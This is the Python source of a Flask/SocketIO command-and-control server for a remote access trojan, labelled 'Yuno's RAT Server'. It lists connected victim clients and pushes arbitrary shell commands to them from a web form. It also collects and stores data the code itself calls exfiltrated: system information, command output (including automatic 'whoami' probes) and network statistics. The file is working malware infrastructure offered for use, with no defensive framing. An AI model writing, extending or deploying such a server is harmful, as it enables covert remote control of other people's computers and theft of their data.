#!/usr/bin/env python3
import os
import json
import datetime
from flask import Flask, render_template, request, send_from_directory
from flask_socketio import SocketIO, emit
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
app.config['UPLOAD_FOLDER'] = 'uploads'
socketio = SocketIO(app, cors_allowed_origins="*")

# Ensure upload directory exists
if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

# Track connected clients
connected_clients = set()

# Store client info
client_info = {}

def get_files():
    """List all files in the upload folder."""
    upload_folder = app.config['UPLOAD_FOLDER']
    files = [f for f in os.listdir(upload_folder) if os.path.isfile(os.path.join(upload_folder, f))]
    return sorted(files)

@app.route('/')
def index():
    """Render the main page with connected clients and uploaded files."""
    files = get_files()
    return render_template('index.html', clients=list(connected_clients), files=files)

@app.route('/send_command', methods=['POST'])
def send_command():
    """Handle command submission from the web interface."""
    client_id = request.form.get('client_id')
    command = request.form.get('command')

    if not client_id or not command:
        return {"status": "error", "message": "Missing client_id or command"}, 400

    # Emit command to the specified client
    socketio.emit('command', command, to=client_id)

    return {"status": "success", "message": f"Command '{command}' sent to {client_id}"}

@app.route('/view_file/<filename>')
def view_file(filename):
    """Render a page to view the contents of an uploaded file."""
    filename = secure_filename(filename)
    file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()
        return render_template('view_file.html', filename=filename, file_content=content)
    else:
        return "File not found", 404

@socketio.on('connect')
def handle_connect():
    """Handle new client connections."""
    client_id = request.sid
    connected_clients.add(client_id)
    print(f"[*] Client connected: {client_id}")
    emit('client_update', list(connected_clients), broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnections."""
    client_id = request.sid
    if client_id in connected_clients:
        connected_clients.remove(client_id)
        client_info.pop(client_id, None)
        print(f"[*] Client disconnected: {client_id}")
        emit('client_update', list(connected_clients), broadcast=True)

@socketio.on('exfil_data')
def handle_exfil_data(data):
    """Handle exfiltrated data from clients."""
    client_id = request.sid
    data = json.loads(data)
    data_type = data.get('type')

    if data_type == "system_info":
        # Store client info
        username = data.get('system', {}).get('username', None)
        if not username:
            # Request username via whoami
            socketio.emit('command', 'whoami', to=client_id)
        else:
            client_info[client_id] = data.get('system', {})
            client_info[client_id]['username'] = username
        # Save system info to a file
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{client_id}_{timestamp}_sysinfo.json"
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
        print(f"[*] Exfiltrated data saved: {filepath}")

    elif data_type == "command_output":
        command = data.get('command', 'unknown')
        output = data.get('output', '')
        current_dir = data.get('current_dir', 'unknown')

        # Check if the command was whoami to update username
        if command.strip().lower() == 'whoami':
            username = output.strip()
            if client_id not in client_info:
                client_info[client_id] = {}
            client_info[client_id]['username'] = username

        # Emit command output to web interface
        emit('command_output', {
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'client_id': client_id,
            'command': command,
            'output': output,
            'current_dir': current_dir
        }, broadcast=True)

    elif data_type == "network_data":
        # Emit network data to web interface
        emit('network_data', {
            'client_id': client_id,
            'timestamp': data.get('timestamp'),
            'bytes_sent': data.get('bytes_sent'),
            'bytes_recv': data.get('bytes_recv'),
            'sent_speed_mbps': data.get('sent_speed_mbps'),
            'recv_speed_mbps': data.get('recv_speed_mbps')
        }, broadcast=True)

    # Emit updated client info to web interface
    client_info_list = [
        {'id': cid, 'system': info}
        for cid, info in client_info.items()
    ]
    emit('client_info', client_info_list, broadcast=True)

@socketio.on('request_client_info')
def handle_request_client_info():
    """Handle requests for client info from the web interface."""
    client_info_list = [
        {'id': cid, 'system': info}
        for cid, info in client_info.items()
    ]
    emit('client_info', client_info_list)

if __name__ == "__main__":
    print("=== Yuno's RAT Server ===")
    print("A remote access server by Yuno\n")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, allow_unsafe_werkzeug=True)